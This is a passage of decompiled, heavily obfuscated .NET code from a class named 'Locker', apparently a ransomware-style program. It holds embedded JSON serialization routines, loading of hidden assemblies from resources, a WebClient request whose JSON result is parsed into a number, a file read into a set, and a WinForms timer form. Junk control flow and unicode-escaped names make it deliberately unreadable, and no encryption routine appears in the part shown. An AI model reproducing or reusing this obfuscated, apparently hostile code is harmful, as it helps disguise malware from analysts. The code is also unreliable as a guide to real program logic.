          goto label_27;
        else
          goto label_25;
label_2:
        int num2;
        if (num2 != 44)
        {
          if (obj1 == '/')
          {
            if (true)
            {
              if (!\u0014.\u0006.\u0001(obj0, 1, false))
              {
                if (true)
                  return false;
                goto label_16;
              }
              else
              {
                if (true)
                {
                  char ch = obj0.\u0001[obj0.\u0002 + 1];
                  return ch == '*' || ch == '/';
                }
                goto label_20;
              }
            }
            else
              goto label_22;
          }
          else
            goto label_18;
        }
label_5:
        return true;
label_25:
        num2 = (int) obj1;
        goto label_2;
label_27:
        if (obj1 != ']')
        {
          num2 = (int) obj1;
          if (true)
          {
            if (num2 != 125)
              goto label_18;
            else
              goto label_5;
          }
          else
            goto label_2;
        }
        else
          goto label_5;
      }
      while (false);
      return true;
label_18:
      if (\u009A.\u0005\u0004(obj1))
        return true;
label_20:
      return false;
    }

    static unsafe bool \u0001([In] \u0013.\u000F.\u0001 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(20);
      *(int*) ((IntPtr) voidPtr + 12) = obj0.\u0001;
      int num1 = *(int*) ((IntPtr) voidPtr + 12);
      if (false)
        return num1 != 0;
      int num2 = num1 - 2;
      int num3;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_34;
          case 1:
            if ((obj0.\u0005 = \u0014.\u0006.\u0001(obj0.\u0001, 16)) >= 0)
            {
              \u0014.\u0006.\u0001(obj0.\u0001, 16);
              obj0.\u0001 = 4;
              goto case 2;
            }
            else
              goto label_17;
          case 2:
            *(int*) ((IntPtr) voidPtr + 4) = \u0014.\u0006.\u0001(obj0.\u0001, 16);
            if (*(int*) ((IntPtr) voidPtr + 4) >= 0)
            {
              \u0014.\u0006.\u0001(obj0.\u0001, 16);
              obj0.\u0001 = 5;
              goto case 3;
            }
            else
              goto label_20;
          case 3:
            *(int*) ((IntPtr) voidPtr + 8) = \u0014.\u0006.\u0001(obj0.\u0001, obj0.\u0001, obj0.\u0005);
            obj0.\u0005 -= *(int*) ((IntPtr) voidPtr + 8);
            num3 = obj0.\u0005;
            if (false)
            {
              num2 = num3;
              continue;
            }
            goto label_23;
          case 4:
            goto label_27;
          case 5:
          case 6:
          case 7:
          case 8:
            goto label_30;
          case 10:
            goto label_32;
          default:
            goto label_33;
        }
      }
label_9:
      int num4;
      switch (num4)
      {
        case 0:
          \u0014.\u0006.\u0001(obj0.\u0001);
          obj0.\u0001 = 3;
          goto label_15;
        case 1:
          obj0.\u0001 = \u0013.\u000F.\u0004.\u0001;
          obj0.\u0002 = \u0013.\u000F.\u0004.\u0002;
          break;
        case 2:
          obj0.\u0001 = new \u0013.\u000F.\u0005();
          obj0.\u0001 = 6;
          goto label_15;
        default:
          goto label_15;
      }
label_13:
      obj0.\u0001 = 7;
label_15:
      return true;
label_17:
      return false;
label_20:
      return false;
label_23:
      if (num3 != 0)
        return !\u0014.\u0006.\u0001(obj0.\u0001);
      obj0.\u0001 = 2;
      return true;
label_27:
      if (!\u0014.\u0006.\u0001(obj0.\u0001, obj0.\u0001))
        return false;
      obj0.\u0001 = \u0014.\u0006.\u0001(obj0.\u0001);
      obj0.\u0002 = \u0014.\u0006.\u0001(obj0.\u0001);
      obj0.\u0001 = 7;
label_30:
      int num5 = \u0014.\u0006.\u0001(obj0) ? 1 : 0;
      return false ? num5 != 0 : num5 != 0;
label_32:
      return false;
label_33:
      int num6 = 0;
      if (num6 == 0)
        return num6 != 0;
      num4 = num6;
      goto label_9;
label_34:
      if (obj0.\u0001)
      {
        obj0.\u0001 = 12;
        return false;
      }
      *(int*) voidPtr = \u0014.\u0006.\u0001(obj0.\u0001, 3);
      if (*(int*) voidPtr < 0)
      {
        if (true)
          return false;
        goto label_13;
      }
      else
      {
        \u0014.\u0006.\u0001(obj0.\u0001, 3);
        if ((*(int*) voidPtr & 1) != 0)
          obj0.\u0001 = true;
        *(int*) ((IntPtr) voidPtr + 16) = *(int*) voidPtr >> 1;
        num4 = *(int*) ((IntPtr) voidPtr + 16);
        goto label_9;
      }
    }

    static bool \u0001([In] object obj0, [In] JsonProperty obj1, [In] \u0010.\u0006 obj2)
    {
      \u0011.\u0005? nullable;
      if (true)
      {
        if (true)
          nullable = obj1.\u0001();
        else
          goto label_3;
      }
label_2:
      if (nullable.GetValueOrDefault(((\u0016.\u0008) obj2).\u0001.\u0001) != \u0011.\u0005.\u0002)
        goto label_14;
label_3:
      if (true)
      {
        if (obj0 == null)
          return false;
      }
      else
        goto label_2;
label_14:
      int num;
      for (int index = \u0014.\u0006.\u0001(obj2, obj1.\u0001().GetValueOrDefault(((\u0016.\u0008) obj2).\u0001.\u0001), \u0008.\u0004.\u0002) ? 1 : 0; index != 0; index = num)
      {
        num = \u0008.\u0008.\u0001(obj0, \u0014.\u0006.\u0001(obj1)) ? 1 : 0;
        if (true)
        {
          if (num != 0)
          {
            if (true)
              return false;
            goto label_14;
          }
          else
            break;
        }
      }
      return true;
    }

    static Assembly \u0001(
      [In] Dictionary<string, string> obj0,
      [In] Dictionary<string, string> obj1,
      [In] AssemblyName obj2)
    {
      string str = obj2.Name.ToLowerInvariant();
      if (obj2.CultureInfo != null && !string.IsNullOrEmpty(obj2.CultureInfo.Name))
        str = string.Format(\u0014.\u0006.\u0082(8661), (object) obj2.CultureInfo.Name, (object) str);
      Stream stream1 = \u0014.\u0006.\u0001(obj0, str);
      byte[] rawAssembly;
      try
      {
        if (stream1 == null)
          return (Assembly) null;
        rawAssembly = \u0014.\u0006.\u0001(stream1);
      }
      finally
      {
        if (stream1 == null)
          goto label_8;
label_7:
        stream1.Dispose();
label_8:
        if (false)
          goto label_7;
      }
      using (Stream stream2 = \u0014.\u0006.\u0001(obj1, str))
      {
        if (stream2 != null)
        {
          byte[] rawSymbolStore = \u0014.\u0006.\u0001(stream2);
          return Assembly.Load(rawAssembly, rawSymbolStore);
        }
      }
      return Assembly.Load(rawAssembly);
    }

    static bool \u0001([In] System.Type obj0, [In] \u0016.\u0007 obj1, [In] string obj2) => global::\u0007.\u009E(obj2) && (object) obj0 != null && (object) obj0 != (object) \u0004\u0002.\u0084\u0004(__typeref (string)) && (object) obj0 != (object) \u0004\u0002.\u0084\u0004(__typeref (object)) && obj1 != null && obj1.\u0001;

    static void \u0001([In] JsonToken obj0, [In] \u0006.\u0005 obj1, [In] \u0008.\u0010 obj2)
    {
      do
      {
        if (obj2.\u0002 == null)
        {
          if (true)
            goto label_5;
        }
        else
        {
          obj2.\u0002.Add((object) obj1);
          obj2.\u0001 = ((\u0015.\u0013) obj2.\u0002).\u0003();
        }
        if (((\u0015.\u0013) obj2.\u0002).\u0001() != JTokenType.Property)
          goto label_1;
      }
      while (false);
      goto label_3;
label_1:
      return;
label_3:
      obj2.\u0002 = ((\u0015.\u0013) obj2.\u0002).\u0001();
      return;
label_5:
      obj2.\u0001 = obj1 ?? new \u0006.\u0005((object) null, JTokenType.Null);
      obj2.\u0001 = (\u0015.\u0013) obj2.\u0001;
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static Decimal? \u0001([In] \u0012.\u0007 obj0, [In] string obj1)
    {
      if (!string.IsNullOrEmpty(obj1))
        goto label_5;
label_4:
      \u0014.\u0006.\u0001(obj0, JsonToken.Null, (object) null, false);
      return new Decimal?();
label_5:
      Decimal result;
      if (Decimal.TryParse(obj1, NumberStyles.Number, (IFormatProvider) \u0014.\u0006.\u0001(obj0), out result))
      {
        \u0014.\u0006.\u0001(obj0, JsonToken.Float, (object) result, false);
        return new Decimal?(result);
      }
      if (true)
      {
        \u0014.\u0006.\u0001(obj0, JsonToken.String, (object) obj1, false);
        throw \u0014.\u0006.\u0001(obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(8674), (IFormatProvider) CultureInfo.InvariantCulture, (object) obj1));
      }
      goto label_4;
    }

    static \u0016.\u0008 \u0001([In] \u0010.\u0007 obj0) => obj0.\u0001 != null ? (\u0016.\u0008) obj0.\u0001 : (\u0016.\u0008) obj0.\u0001;

    static JsonWriterException \u0001([In] JsonWriter obj0, [In] object obj1) => \u0014.\u0006.\u0001(obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(8731), (IFormatProvider) \u0098.\u0002\u0004(), (object) \u0001\u0002.\u007E\u0017\u0004(obj1)), (Exception) null);

    static void \u0001([In] \u0016.\u0007 obj0, [In] object obj1, [In] StreamingContext obj2)
    {
label_0:
      if (obj0.\u0003 == null)
        goto label_11;
label_1:
      if (true)
      {
        if (true)
        {
          IEnumerator<\u0008.\u000E> enumerator = obj0.\u0003.GetEnumerator();
          try
          {
            while (\u0015\u0002.\u007E\u009E\u0004((object) enumerator))
            {
              if (true)
                enumerator.Current(obj1, obj2);
              else
                break;
            }
          }
          finally
          {
            if (enumerator != null)
              global::\u0011.\u007E\u0007\u0002((object) enumerator);
          }
        }
      }
      else
        goto label_0;
label_11:
      if (true)
      {
        if (false)
          goto label_1;
      }
      else
        goto label_0;
    }

    static object \u0001([In] INullable obj0)
    {
      switch (obj0)
      {
        case null:
          return (object) null;
        case SqlInt32 sqlInt32:
          return \u0014.\u0006.\u0001((INullable) sqlInt32);
        case SqlInt64 sqlInt64:
          return \u0014.\u0006.\u0001((INullable) sqlInt64);
        case SqlBoolean sqlBoolean:
          return \u0014.\u0006.\u0001((INullable) sqlBoolean);
        default:
          switch (obj0)
          {
            case SqlString sqlString:
              return \u0014.\u0006.\u0001((INullable) sqlString);
            case SqlDateTime sqlDateTime:
              return \u0014.\u0006.\u0001((INullable) sqlDateTime);
            default:
              throw new ArgumentException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(8856), (IFormatProvider) \u0098.\u0002\u0004(), (object) \u0001\u0002.\u007E\u0017\u0004((object) obj0)));
          }
      }
    }

    static IEnumerable<string> \u0001([In] string obj0) => (IEnumerable<string>) new Locker.\u0001(-2)
    {
      \u0003 = obj0
    };

    static System.Type \u0001([In] MemberInfo obj0)
    {
      \u0014.\u0006.\u0001((object) obj0, \u0014.\u0006.\u0082(8901));
      MemberTypes memberTypes = \u0015.\u000E.\u0001(obj0);
      if (memberTypes > MemberTypes.Field)
      {
        if (memberTypes == MemberTypes.Method)
          return \u0001\u0002.\u007E\u001B\u0004((object) (MethodInfo) obj0);
        if (true)
        {
          if (memberTypes == MemberTypes.Property)
            return \u0001\u0002.\u007E\u001D\u0004((object) (PropertyInfo) obj0);
        }
        else
          goto label_10;
      }
      else
        goto label_9;
label_8:
      throw new ArgumentException(\u0014.\u0006.\u0082(8910), \u0014.\u0006.\u0082(8901));
label_9:
      if (memberTypes == MemberTypes.Event)
        return \u0001\u0002.\u007E\u0081\u0004((object) (EventInfo) obj0);
label_10:
      if (memberTypes == MemberTypes.Field)
        return \u0001\u0002.\u007E\u001F\u0004((object) (FieldInfo) obj0);
      goto label_8;
    }

    static Array \u0001([In] int obj0, [In] IList obj1, [In] System.Type obj2)
    {
      IList<int> source = \u0014.\u0006.\u0001(obj0, obj1);
      while (source.Count < obj0)
        source.Add(0);
      Array array = \u0011\u0003.\u0094\u0006(obj2, source.ToArray<int>());
      \u0014.\u0006.\u0001(array, new int[0], obj1);
      return array;
    }

    static float? \u0001([In] \u0015.\u0013 obj0)
    {
      if (obj0 == null)
        return new float?();
      \u0006.\u0005 obj = \u0014.\u0006.\u0001(obj0);
      if (obj != null)
      {
        int num = 1;
        if (num != 0)
          num = \u0014.\u0006.\u0001(num != 0, \u0015.\u0013.\u0002, (\u0015.\u0013) obj) ? 1 : 0;
        if (num != 0)
          return obj.\u0001 == null ? new float?() : new float?(Convert.ToSingle(obj.\u0001, (IFormatProvider) CultureInfo.InvariantCulture));
      }
      throw new ArgumentException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(9011), (IFormatProvider) CultureInfo.InvariantCulture, (object) \u0014.\u0006.\u0001(obj0)));
    }

    static void \u0001([In] \u0011.\u0003 obj0)
    {
      while (!\u0014.\u0006.\u0001(obj0, \u0015.\u0006.\u0005))
      {
        if (true)
          throw \u0014.\u0006.\u0001((\u0012.\u0007) obj0, \u0014.\u0006.\u0082(9101));
      }
      \u0011.\u0003 obj = ((\u0012.\u0007) obj0).\u0001 != \u0015.\u0002.\u0002 ? obj0 : throw new JsonReaderException(\u0014.\u0006.\u0082(9052));
      // ISSUE: variable of a boxed type
      __Boxed<double> local = (System.ValueType) double.PositiveInfinity;
      if (false)
        return;
      \u0014.\u0006.\u0001((\u0012.\u0007) obj, JsonToken.Float, (object) local);
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static void \u0001([In] \u0015.\u0001 obj0)
    {
      if (true)
        goto label_8;
label_1:
      do
      {
        global::\u0011.\u0014\u0002((object) obj0);
        global::\u0012.\u007E\u0080\u0002((object) obj0.\u0001, true);
        \u0012\u0003.\u007E\u0095\u0006((object) obj0.\u0001, new EventHandler(obj0.\u0001));
        do
        {
          do
          {
            \u0013\u0003.\u0098\u0006((object) obj0, new SizeF(6f, 13f));
            \u0014\u0003.\u0099\u0006((object) obj0, AutoScaleMode.Font);
            if (true)
            {
              if (true)
              {
                \u0015\u0003.\u009A\u0006((object) obj0, new Size(284, 262));
                \u0019.\u009A\u0002((object) obj0, \u0014.\u0006.\u0082(9154));
                \u0019.\u007E\u0098\u0002((object) obj0, \u0014.\u0006.\u0082(9175));
              }
              else
                goto label_1;
            }
            else
              goto label_9;
          }
          while (false);
          global::\u0012.\u0086\u0002((object) obj0, false);
        }
        while (false);
      }
      while (false);
      return;
label_8:
      obj0.\u0001 = (IContainer) new Container();
label_9:
      obj0.\u0001 = new System.Windows.Forms.Timer(obj0.\u0001);
      goto label_1;
    }

    static \u0008.\u000E \u0001([In] MethodInfo obj0) => new \u0008.\u000E(new \u0016.\u0007.\u0001()
    {
      \u0001 = obj0
    }.\u0001);

    static void \u0001([In] \u0012.\u0007 obj0, [In] JsonToken obj1, [In] object obj2) => \u0014.\u0006.\u0001(obj0, obj1, obj2, true);

    static void \u0001([In] \u0005.\u0004 obj0)
    {
      do
      {
        if (true)
          goto label_3;
label_2:
        continue;
label_3:
        \u0005.\u0004 obj1 = obj0;
        \u0001.\u0003 obj2 = ((JsonWriter) obj0).\u0001;
        bool[] flagArray = \u0014.\u0006.\u0001(obj0.\u0002, obj2);
        obj1.\u0001 = flagArray;
        goto label_2;
      }
      while (false);
    }

    static unsafe void \u0001(
      [In] \u0010.\u0006 obj0,
      [In] JsonWriter obj1,
      [In] IDictionary obj2,
      [In] \u0003.\u0006 obj3,
      [In] JsonProperty obj4,
      [In] \u0006.\u0002 obj5,
      [In] JsonProperty obj6)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(5);
      object obj7 = obj2 is \u0010.\u0003 obj8 ? obj8.\u0001() : (object) obj2;
      \u0014.\u0006.\u0001(obj0, obj1, (\u0016.\u0007) obj3, obj7);
      obj0.\u0001.Add(obj7);
      \u0014.\u0006.\u0001(obj4, obj0, (\u0016.\u0007) obj3, obj6, obj1, obj7, obj5);
      if (((\u0006.\u0002) obj3).\u0001 == null)
      {
        \u0003.\u0006 obj9 = obj3;
        \u0015.\u0010 obj10 = ((\u0016.\u0008) obj0).\u0001.\u0001;
        System.Type type = obj3.\u0003();
        if ((object) type == null)
        {
          // ISSUE: type reference
          type = \u0004\u0002.\u0084\u0004(__typeref (object));
        }
        \u0016.\u0007 obj11 = obj10.\u0001(type);
        \u0014.\u0006.\u0001((\u0006.\u0002) obj9, obj11);
      }
      if (obj3.\u0001() == null)
      {
        \u0003.\u0006 obj12 = obj3;
        \u0015.\u0010 obj13 = ((\u0016.\u0008) obj0).\u0001.\u0001;
        System.Type type = obj3.\u0001();
        if ((object) type == null)
        {
          // ISSUE: type reference
          type = \u0004\u0002.\u0084\u0004(__typeref (object));
        }
        \u0016.\u0007 obj14 = obj13.\u0001(type);
        obj12.\u0001(obj14);
      }
      *(int*) voidPtr = \u0014.\u0006.\u0001(obj1);
      IDictionaryEnumerator dictionaryEnumerator = \u0083\u0002.\u007E\u0094\u0005((object) obj2);
label_9:
      try
      {
label_27:
        while (\u0015\u0002.\u007E\u009E\u0004((object) dictionaryEnumerator))
        {
          DictionaryEntry dictionaryEntry = (DictionaryEntry) \u0084\u0002.\u007E\u0095\u0005((object) dictionaryEnumerator);
          string str1;
          do
          {
            object key = dictionaryEntry.Key;
            if (true)
            {
              \u0016.\u0007 obj15 = obj3.\u0001();
              // ISSUE: cast to a reference type
              str1 = \u0014.\u0006.\u0001(key, (bool&) ((IntPtr) voidPtr + 4), obj1, obj0, obj15);
            }
            else
              goto label_9;
          }
          while (false);
          string str2 = obj3.\u0001() != null ? obj3.\u0001()(str1) : str1;
          try
          {
            object obj16 = dictionaryEntry.Value;
            \u0016.\u0007 obj17 = ((\u0006.\u0002) obj3).\u0002;
            if (obj17 != null)
              goto label_16;
label_15:
            obj17 = \u0014.\u0006.\u0001(obj16, obj0);
label_16:
            \u0016.\u0007 obj18 = obj17;
            int num;
            for (int index = \u0014.\u0006.\u0001(obj16, obj18, (JsonProperty) null, obj4, (\u0006.\u0002) obj3, obj0) ? 1 : 0; index == 0; index = num)
            {
              num = \u0014.\u0006.\u0001(obj0, obj1, obj16, (JsonProperty) null, obj18, (\u0006.\u0002) obj3, obj4) ? 1 : 0;
              if (true)
              {
                if (num != 0)
                {
                  obj1.\u0001(str2, (bool) *(sbyte*) ((IntPtr) voidPtr + 4));
                  if (true)
                  {
                    \u0014.\u0006.\u0001(obj0, obj1, obj16, obj18, (JsonProperty) null, (\u0006.\u0002) obj3, obj4);
                    goto label_27;
                  }
                  else
                    goto label_15;
                }
                else
                  goto label_27;
              }
            }
            obj1.\u0001(str2, (bool) *(sbyte*) ((IntPtr) voidPtr + 4));
            \u0014.\u0006.\u0001(obj16, obj1, obj0);
          }
          catch (Exception ex)
          {
            if (\u0014.\u0006.\u0001(\u0014.\u0006.\u0001(obj1), obj7, (object) str2, ex, (\u000F.\u0001) null, (\u0016.\u0007) obj3, (\u0016.\u0008) obj0))
              \u0014.\u0006.\u0001(obj1, obj0, *(int*) voidPtr);
            else
              throw;
          }
        }
      }
      finally
      {
        if (dictionaryEnumerator is IDisposable disposable)
          global::\u0011.\u007E\u0007\u0002((object) disposable);
      }
      obj1.\u0011();
      obj0.\u0001.RemoveAt(obj0.\u0001.Count - 1);
      \u0014.\u0006.\u0001(obj1, obj0, obj7, (\u0016.\u0007) obj3);
    }

    static bool \u0001([In] System.Type obj0) => false;

    static double \u0001()
    {
      string str1 = global::\u0006.\u009B(\u0014.\u0006.\u0082(9184), \u0014.\u0006.\u0082(9225));
      if (true)
        goto label_5;
label_1:
      string str2;
      \u0012.\u0015 obj1 = \u0014.\u0006.\u0001(\u0016\u0003.\u007E\u009C\u0006((object) new WebClient(), str2));
      if (true)
        goto label_6;
label_2:
      \u0012.\u0015 obj2;
      \u0015.\u0013 obj3 = obj2[\u0014.\u0006.\u0082(9242)];
      if (obj3 != null && \u0007\u0002.\u008C\u0004(global::\u0001.\u007E\u0001((object) obj3), \u0014.\u0006.\u0082(9251)))
        throw new Exception(global::\u0001.\u007E\u0001((object) obj2));
      return obj2[\u0014.\u0006.\u0082(9260)][(object) \u0014.\u0006.\u0082(9269)][(object) \u0014.\u0006.\u0082(9282)].\u0001<double>((object) \u0014.\u0006.\u0082(4207));
label_6:
      obj2 = obj1;
      goto label_2;
label_5:
      str2 = str1;
      goto label_1;
    }

    static Assembly \u0001([In] object obj0, [In] ResolveEventArgs obj1) => \u0014.\u0006.\u0001(global::\u0001.\u007E\u0012((object) obj1));

    static void \u0001([In] \u0011.\u0003 obj0)
    {
      obj0.\u0001.\u0001(0);
      obj0.\u0001 = new \u0015.\u0008();
    }

    static \u0012.\u0011<string, object> \u0001([In] \u0016.\u0008 obj0)
    {
      if (obj0.\u0001 == null)
        obj0.\u0001 = new \u0012.\u0011<string, object>((IEqualityComparer<string>) EqualityComparer<string>.Default, (IEqualityComparer<object>) new \u0016.\u0008.\u0001(), \u0014.\u0006.\u0082(9295), \u0014.\u0006.\u0082(9356));
      return obj0.\u0001;
    }

    static bool \u0001([In] JsonSerializerInternalReader obj0, [In] \u0008.\u0004 obj1, [In] \u0008.\u0004 obj2) => (obj1 & obj2) == obj2;

    static FormatterAssemblyStyle \u0001([In] \u0016.\u0001 obj0)
    {
      FormatterAssemblyStyle? nullable = obj0.\u0001;
      int num = nullable.HasValue ? 1 : 0;
      if (false)
        return (FormatterAssemblyStyle) num;
      return num == 0 ? FormatterAssemblyStyle.Simple : nullable.GetValueOrDefault();
    }

    static unsafe int \u0001([In] int obj0, [In] int obj1, [In] char[] obj2)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      *(int*) voidPtr = 0;
      *(int*) ((IntPtr) voidPtr + 4) = obj1;
      while (*(int*) ((IntPtr) voidPtr + 4) < obj0)
      {
        *(int*) voidPtr = *(int*) voidPtr + (\u0014.\u0006.\u0001(obj2[*(int*) ((IntPtr) voidPtr + 4)]) << (obj0 - 1 - *(int*) ((IntPtr) voidPtr + 4)) * 4);
        *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) + 1;
      }
      return *(int*) voidPtr;
    }

    static bool \u0001(
      [In] \u0010.\u0006 obj0,
      [In] \u0006.\u0001 obj1,
      [In] \u0016.\u0007 obj2,
      [In] JsonProperty obj3,
      [In] \u0006.\u0002 obj4,
      [In] JsonProperty obj5)
    {
      \u0006.\u0001 obj6 = (\u0006.\u0001) ((int) obj3?.\u0001() ?? (int) obj5?.\u0002() ?? (int) obj4?.\u0001() ?? (int) ((\u0016.\u0008) obj0).\u0001.\u0001);
      if (\u0014.\u0006.\u0001(obj0, obj6, obj1))
        return true;
      if (\u0014.\u0006.\u0001(obj0, obj6, \u0006.\u0001.\u0005))
      {
        if (obj3 != null)
        {
          if ((object) obj2.\u0002() != (object) obj3.\u0001().\u0002)
            return true;
        }
        else if (obj4 != null)
        {
          if (obj4.\u0001 == null || (object) obj2.\u0002() != (object) obj4.\u0001.\u0002)
            return true;
        }
        else if ((object) obj0.\u0001 != null && obj0.\u0001.Count == obj0.\u0001)
        {
          \u0016.\u0007 obj7 = ((\u0016.\u0008) obj0).\u0001.\u0001.\u0001(obj0.\u0001);
          if ((object) obj2.\u0002() != (object) obj7.\u0002)
            return true;
        }
      }
      return false;
    }

    static JsonReaderException \u0001([In] \u0012.\u0007 obj0, [In] string obj1) => \u0014.\u0006.\u0001(obj1, obj0, (Exception) null);

    static unsafe int \u0001([In] \u0013.\u000F.\u0002 obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      *(int*) voidPtr = 0;
      int num1;
      int num2;
      int num3;
      while (true)
      {
        int num4 = obj0.\u0003;
        int num5 = 0;
        while (true)
        {
          if (num5 == 0)
          {
            if (num4 <= num5 || obj3 <= 0)
            {
              if (obj3 != 0)
              {
                *(int*) ((IntPtr) voidPtr + 4) = obj0.\u0002 - obj0.\u0001;
                int num6 = obj3;
                num5 = *(int*) ((IntPtr) voidPtr + 4);
                num4 = num6;
              }
              else
                break;
            }
            else
              goto label_21;
          }
          if (num4 > num5)
            obj3 = *(int*) ((IntPtr) voidPtr + 4);
          do
          {
            Array.Copy((Array) obj0.\u0001, obj0.\u0001, (Array) obj1, obj2, obj3);
          }
          while (false);
          obj0.\u0001 += obj3;
          num1 = obj0.\u0001;
          if (true)
          {
            int num7 = obj0.\u0002;
            num2 = num1 - num7;
            num3 = 1;
            if (num3 == 0)
            {
              num5 = num3;
              num4 = num2;
            }
            else
              goto label_15;
          }
          else
            goto label_20;
        }
        if (false)
          goto label_22;
        else
          break;
label_21:
        obj1[obj2++] = (byte) obj0.\u0001;
        if (true)
        {
          obj0.\u0001 >>= 8;
          obj0.\u0003 -= 8;
          --obj3;
        }
        else
          goto label_16;
label_22:
        *(int*) voidPtr = *(int*) voidPtr + 1;
      }
      return *(int*) voidPtr;
label_15:
      if ((num2 & num3) == 0)
        goto label_19;
label_16:
      if (true)
        obj0.\u0001 = (uint) obj0.\u0001[obj0.\u0001++] & (uint) byte.MaxValue;
      obj0.\u0003 = 8;
label_19:
      num1 = *(int*) voidPtr;
label_20:
      int num8 = obj3;
      return num1 + num8;
    }

    static XmlDateTimeSerializationMode \u0001([In] DateTimeKind obj0)
    {
      do
      {
        switch (obj0)
        {
          case DateTimeKind.Unspecified:
            if (true)
            {
              int num = 2;
              return num == 0 ? (XmlDateTimeSerializationMode) num : (XmlDateTimeSerializationMode) num;
            }
            goto label_8;
          case DateTimeKind.Utc:
            continue;
          case DateTimeKind.Local:
            if (true)
              return XmlDateTimeSerializationMode.Local;
            goto case DateTimeKind.Unspecified;
          default:
            goto label_8;
        }
      }
      while (false);
      return XmlDateTimeSerializationMode.Utc;
label_8:
      throw \u0014.\u0006.\u0001(\u0014.\u0006.\u0082(9433), (object) obj0, \u0014.\u0006.\u0082(9442));
    }

    static object \u0001([In] \u0006.\u0005 obj0) => obj0.\u0001;

    static IList<\u0008.\u000E> \u0001([In] \u0016.\u0007 obj0)
    {
      if (obj0.\u0003 == null)
        obj0.\u0003 = (IList<\u0008.\u000E>) new List<\u0008.\u000E>();
      return obj0.\u0003;
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static HashSet<string> \u0001()
    {
      HashSet<string> stringSet = new HashSet<string>();
      if (System.IO.File.Exists(Locker.\u0001))
      {
        string[] strArray = System.IO.File.ReadAllLines(Locker.\u0001);
        int num1 = 0;
        while (true)
        {
          int index = num1;
label_10:
          int num2 = index;
          int num3 = strArray.Length;
          int num4;
          while (true)
          {
            num4 = num3;
            if (false)
              num3 = num4;
            else
              break;
          }
          if (num2 < num4)
          {
            if (true)
              goto label_15;
label_6:
            string str;
            stringSet.Add(str);
            int num5 = index;
            while (true)
            {
              int num6 = num5 + 1;
              if (false)
              {
                num5 = num6;
              }
              else
              {
                index = num6;
                goto label_10;
              }
            }
            num1 = num5;
            continue;
label_15:
            str = strArray[index];
            goto label_6;
          }
          else
            break;
        }
      }
      return stringSet;
    }

    static void \u0001([In] JsonSerializerInternalReader obj0, [In] \u0012.\u0007 obj1, [In] \u0016.\u0007 obj2, [In] object obj3)
    {
      if (obj0.\u0001 != null && obj0.\u0001.\u0001() >= TraceLevel.Info)
        goto label_2;
label_1:
      \u0014.\u0006.\u0001(obj2, obj3, obj0.\u0001.\u0001);
      return;
label_2:
      obj0.\u0001.\u0001(TraceLevel.Info, \u0011.\u0002.\u0001(obj1 as \u000F.\u0001, obj1.\u0001(), \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(9483), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj2.\u0002())), (Exception) null);
      goto label_1;
    }

    static \u0015.\u0013 \u0001([In] \u000E.\u000E obj0) => obj0.\u0003;

    static bool \u0001(
      JsonProperty _param0,
      JsonSerializerInternalReader _param1,
      \u0012.\u0007 _param2,
      JsonProperty _param3,
      ref string _param4,
      ref object _param5,
      object _param6,
      [Out] \u0006.\u0002 _param7,
      out System.Type _param8,
      [In] ref \u0016.\u0007 obj9)
    {
      _param4 = (string) null;
      _param5 = (object) null;
      if (_param2.\u0001() == JsonToken.PropertyName)
      {
        string str1 = global::\u0001.\u007E\u0001(_param2.\u0001());
        if (\u001F.\u007E\u0011\u0003((object) str1) > 0 && \u001B\u0002.\u007E\u0088\u0005((object) str1, 0) == '$')
        {
          bool flag;
          do
          {
            string str2 = global::\u0001.\u007E\u0001(_param2.\u0001());
            if (\u008E\u0002.\u0007\u0006(str2, \u0014.\u0006.\u0082(9520), StringComparison.Ordinal))
            {
              \u0014.\u0006.\u0001(_param2);
              if (_param2.\u0001() != JsonToken.String && _param2.\u0001() != JsonToken.Null)
                throw \u0014.\u0006.\u0001(_param2, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(9529), (IFormatProvider) \u0098.\u0002\u0004(), (object) \u0014.\u0006.\u0082(9520)));
              string str3 = _param2.\u0001() != null ? global::\u0001.\u007E\u0001(_param2.\u0001()) : (string) null;
              if (true)
              {
                \u0014.\u0006.\u0001(_param2);
                if (str3 != null)
                {
                  if (_param2.\u0001() == JsonToken.PropertyName)
                    throw \u0014.\u0006.\u0001(_param2, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(9614), (IFormatProvider) \u0098.\u0002\u0004(), (object) \u0014.\u0006.\u0082(9520)));
                  _param5 = \u0014.\u0006.\u0001(_param1.\u0001).\u0001((object) _param1, str3);
                  if (_param1.\u0001 == null)
                    goto label_12;
                }
                else
                {
                  flag = true;
                  goto label_22;
                }
              }
              if (_param1.\u0001.\u0001() >= TraceLevel.Info)
